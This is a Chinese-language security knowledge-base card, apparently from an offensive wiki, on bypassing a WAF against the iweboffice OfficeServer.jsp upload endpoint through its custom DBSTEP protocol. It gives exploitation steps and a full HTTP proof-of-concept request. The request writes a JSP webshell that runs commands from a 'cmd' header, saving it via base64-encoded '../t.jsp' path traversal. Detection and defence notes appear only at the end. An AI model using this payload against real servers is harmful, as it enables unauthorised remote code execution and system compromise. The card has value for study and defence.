---
id: web-generic-file-upload-iweboffice-dbstep-custom-protocol-waf-bypass
title: iweboffice 自定义上传协议（DBSTEP）绕过 WAF：application/x-www-form-urlencoded 正文携带 JSP 与 base64 路径穿越
type: scenario
domain: web
path: web/generic/file-upload
technique: iweboffice-dbstep-custom-upload-protocol-waf-bypass
tags:
- web
- file-upload
- iweboffice
- custom-protocol
- waf-bypass
- jsp
- webshell
- path-traversal
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V481
  verified_at: '2026-11-10T20:33:39+08:00'
  notes: 已对照幻灯片06核对：POST /iweboffice/OfficeServer.jsp、Content-Type application/x-www-form-urlencoded、首行 DBSTEP V3.0 87 0 44 DBSTEP=REJTVEVQ、OPTION/RECORDID/USERNAME/FILETYPE 分段与正文 JSP Runtime.getRuntime().exec(header.cmd) 一致；base64 字段已本地解码复核（SAVEFILE/1/../t.jsp/DBSTEP）。未验证点：长度字段与落盘路径未按真实产品复现，cmd 请求头为 header.cmd 的合理补全（卡内已注明）。
url: /docs/web/generic/file-upload/web-generic-file-upload-iweboffice-dbstep-custom-protocol-waf-bypass/
draft: false
kb_aliases:
- iweboffice 上传
- OfficeServer.jsp
- DBSTEP V3.0
- 自定义协议上传
- 文档中间件上传绕过
- SAVEFILE base64
---

## 一句话结论

iweboffice 的文档上传端点 `/iweboffice/OfficeServer.jsp` 使用自定义的 `DBSTEP V3.0` 文本协议：`Content-Type` 仍是 `application/x-www-form-urlencoded`，但正文首行是 `DBSTEP V3.0 <长度数字段> DBSTEP=REJTVEVQ` 形式的分段头，后续为 `OPTION`/`RECORDID`/`USERNAME`/`FILETYPE` 等字段与文件正文；把 JSP 代码作为正文提交（`FILETYPE` 用 base64 指定落盘名，可带 `../` 路径穿越），让命令从 `header.cmd` 取，标准解析器（WAF）不认识 DBSTEP 协议，既提取不到文件名也看不到 JSP 内容，请求被放行后由 OfficeServer.jsp 解析落盘。

## 原理

- **自定义协议不是 key=value**：首行 `DBSTEP V3.0` 后跟若干数字（分段长度/偏移）与 `DBSTEP=REJTVEVQ`（base64 的 “DBSTEP”），真正的字段在后续行且值多为 base64：`OPTION=U0FWRUZJTEU=`（SAVEFILE）、`RECORDID=MQ==`（1）、`FILETYPE=Li4vdC5qc3A=`（`../t.jsp`）。WAF 的 urlencoded/multipart 解析器会把首行当成畸形键值或忽略，无法按字段语义取出“文件名/文件内容”。
- **协议解析差异即绕过**：OfficeServer.jsp 按 DBSTEP 格式解析正文，把最后一段当文件内容保存；WAF 只认标准 `application/x-www-form-urlencoded` 键值对，看到的是无意义的分段头与 base64 字段，内容规则无法作用到真正的 JSP 正文。与“上传解析差异”同源：检测器与后端对同一请求的理解不一致。
- **base64 字段隐藏文件名**：`FILETYPE` 的值是 base64 编码的目标文件名，`../t.jsp` 解码后带路径穿越，配合 `OPTION=SAVEFILE` 可把文件写到上传目录之外的可执行路径；WAF 若只做明文后缀/路径检查，看不到 base64 里的 `.jsp`。
- **载荷从 Header 取命令**：正文放 `<% Runtime.getRuntime().exec(header.cmd); %>`，命令由请求头 `cmd` 提供，同一份落盘 JSP 可反复执行不同命令；WAF 若只检查正文里的 `Runtime`（本请求正文确实包含，但被放在它不解析的协议段里）也未必命中。
- **为什么有效**：iweboffice 这类文档中间件为了兼容客户端控件，使用私有上传协议；通用 WAF 不会为每个产品实现协议解析器，默认按标准协议处理，于是出现“WAF 看不见、后端看得懂”的空档。

## 触发条件

- 目标暴露 iweboffice 的 `OfficeServer.jsp`（或同类文档中间件的自定义上传端点）；
- WAF/流量检测未实现该产品的 DBSTEP 协议解析，按标准 urlencoded/multipart 处理；
- 端点允许保存文件且落盘目录可执行/可通过 `FILETYPE` 路径穿越到可执行目录；
- 请求能到达该端点（内网/外网均可，取决于暴露面）。

## 利用步骤

1. 识别端点：访问/探测 `/iweboffice/OfficeServer.jsp`，确认产品与响应特征。
2. 构造 DBSTEP 上传请求：首行 `DBSTEP V3.0` + 长度字段 + `DBSTEP=REJTVEVQ`，后续 `OPTION=U0FWRUZJTEU=`、`RECORDID=MQ==`、`USERNAME=`、`FILETYPE=<base64 目标路径>`，正文为 JSP 代码。
3. 在请求头加入 `cmd: <要执行的命令>`，正文 JSP 用 `Runtime.getRuntime().exec(header.cmd)` 读取。
4. 发送并访问落盘文件（按 FILETYPE 路径推断 URL），确认命令执行与回显。
5. 若被拦截，调整 base64 字段/长度值、换用路径穿越目标目录，或组合其它解析差异手法。

## PoC

```http
POST /iweboffice/OfficeServer.jsp HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 159
cmd: whoami

DBSTEP V3.0     87          0           44          DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=MQ==
USERNAME=
FILETYPE=Li4vdC5qc3A=
<% Runtime.getRuntime().exec(header.cmd); %>
```

字段解码：`OPTION=U0FWRUZJTEU=`→`SAVEFILE`，`RECORDID=MQ==`→`1`，`FILETYPE=Li4vdC5qc3A=`→`../t.jsp`，`DBSTEP=REJTVEVQ`→`DBSTEP`。

以上按幻灯片请求结构整理；长度数字段与落盘路径需按目标版本/部署实测，未对真实目标执行。

## 变体与关联

- 变体：`FILETYPE` 换成其它 base64 路径（穿越到 Web 根/可执行目录）；`OPTION` 换其它操作（打开/保存/另存）；命令改由 POST 参数/文件名提供。
- 变体：其它文档中间件（在线编辑、OA 附件）的私有上传协议，同样利用“WAF 只认标准协议”的空档。
- 关联：[[web-generic-file-upload-nonstandard-filename-param-parser-differential]]（一般化的上传解析差异）、[[web-generic-file-upload-multipart-filename-jsp-tomcat-webshell]]（标准 multipart 下的 JSP 落盘）。
- 边界：产品升级/加固后端点可能校验来源、限制保存路径或改用标准协议；WAF 若实现了该产品协议解析则失效；需要目标确实暴露该端点。

## 检测与防御

- 检测（WAF/NDR）：对已知文档中间件端点（如 `OfficeServer.jsp`）实现产品协议解析或直接阻断；对首行 `DBSTEP`、base64 字段（`FILETYPE` 含路径穿越）与正文中的 JSP 代码告警；对“Content-Type 为 urlencoded 但正文含分段头/可执行脚本”的请求拒绝。
- 检测（主机）：`OfficeServer.jsp` 请求后 Web 目录出现新文件；文件内容含 `Runtime.getRuntime().exec`；进程产生异常子进程。
- 防御：升级/修补文档中间件，禁用不必要的上传端点；上传目录移出 Web 根并禁止脚本执行；对上传文件名做 basename/白名单校验；WAF 采用“未知协议/歧义请求拒绝优先”。
